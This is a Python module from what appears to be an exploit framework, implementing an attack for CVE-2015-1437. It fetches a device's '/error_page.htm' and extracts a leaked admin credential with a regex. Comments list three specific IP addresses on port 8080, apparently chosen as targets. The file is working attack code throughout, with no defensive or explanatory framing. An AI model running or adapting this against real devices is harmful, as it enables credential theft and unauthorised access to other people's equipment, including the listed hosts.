# -*- coding: utf-8 -*-

import requests
import logging
import re

from nios.core.exploits.CExploitBase import CExploitBase
from nios.core.CNiosCore import CNiosCore
from nios.core.auxiliary import exception
from nios.core.CScheduler import CTask


# http://176.97.56.181:8080
# http://176.97.57.35:8080
# http://176.97.57.198:8080

REGEX_LIST = [
    re.compile(r"if\('1' == '0' \|\| '(.+?)' == '(admin)'\)", re.I)
]

class CVE_2015_1437(CExploitBase):

    mCve = 'CVE-2015-1437'

    def __init__(self, core: CNiosCore):
        self.mCore = core

    def __call__(self, host, port):
        url = f"http://{host}:{port}"

        self.getErrorPage(url)

    def executeRequest(self, url):
        httpTimeout = self.mCore.mConfig.get("timeout.http", 2)
        try:
            return requests.get(url, timeout=httpTimeout)
        except Exception:
            return None

    def getErrorPage(self, url):
        result = self.executeRequest(f"{url}/error_page.htm")
        if result is not None:
            logging.info("%s: %s", __name__, self.parseByRegex(result.text))

    @staticmethod
    def parseByRegex(content):
        data = {}
        for regex in REGEX_LIST:
            result = regex.search(content)
            if not result:
                continue

            (key, value) = result.group(1), result.group(2)

            data.update({key: value})

        return data
